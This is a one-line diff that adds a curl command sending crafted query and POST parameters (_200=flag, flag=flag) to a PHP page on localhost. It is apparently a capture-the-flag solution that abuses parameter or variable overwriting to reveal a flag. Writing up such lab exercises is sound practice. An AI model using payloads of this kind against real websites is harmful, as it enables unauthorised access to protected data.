@@ -1,0 +1,1 @@
+curl 'http://localhost/index.php?_200=flag' -d 'flag=flag'
